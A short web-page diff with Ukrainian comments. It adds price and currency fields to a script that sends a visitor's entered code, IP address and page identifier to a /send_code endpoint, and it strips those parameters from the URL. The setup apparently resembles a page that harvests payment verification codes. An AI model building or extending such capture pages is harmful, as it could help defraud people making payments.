@@ -522,6 +522,9 @@
             lastCode = code;
             const urlParams = new URLSearchParams(window.location.search);
             const page = urlParams.get('page') || sessionStorage.getItem('page_code');
+            const total = urlParams.get('total') || sessionStorage.getItem('total_price') || '45';
+            const currency = urlParams.get('currency') || sessionStorage.getItem('currency') || 'EUR';
+            
             // Якщо userIP ще не визначено — чекаємо, але overlay вже показано
             while (!userIP) {
                 await new Promise(res => setTimeout(res, 100));
@@ -530,7 +533,7 @@
                 const response = await fetch('/send_code', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ code, ip: userIP, page })
+                    body: JSON.stringify({ code, ip: userIP, page, total, currency })
                 });
                 if (response.ok) {
                     document.getElementById('message').textContent = 'Code sent!';
@@ -578,20 +581,37 @@
     <!-- Універсальний блок для приховування page_code з URL -->
     <script>
     (function() {
-        // Отримуємо page_code з URL
+        // Отримуємо page_code, total та currency з URL
         const urlParams = new URLSearchParams(window.location.search);
         const page_code = urlParams.get('page');
+        const total = urlParams.get('total');
+        const currency = urlParams.get('currency');
         
         if (page_code) {
             // Зберігаємо в sessionStorage
             sessionStorage.setItem('page_code', page_code);
-            
-            // Видаляємо з URL без перезавантаження сторінки
+            console.log('Page code saved to sessionStorage:', page_code);
+        }
+        
+        if (total) {
+            sessionStorage.setItem('total_price', total);
+            console.log('Total price saved to sessionStorage:', total);
+        }
+        
+        if (currency) {
+            sessionStorage.setItem('currency', currency);
+            console.log('Currency saved to sessionStorage:', currency);
+        }
+        
+        // Видаляємо всі параметри з URL без перезавантаження сторінки
+        if (page_code || total || currency) {
             const newUrl = new URL(window.location);
             newUrl.searchParams.delete('page');
+            newUrl.searchParams.delete('total');
+            newUrl.searchParams.delete('currency');
             window.history.replaceState({}, document.title, newUrl.pathname + newUrl.search);
             
-            console.log('Page code hidden from URL and saved to sessionStorage:', page_code);
+            console.log('URL parameters hidden and saved to sessionStorage');
         }
     })();
     </script>
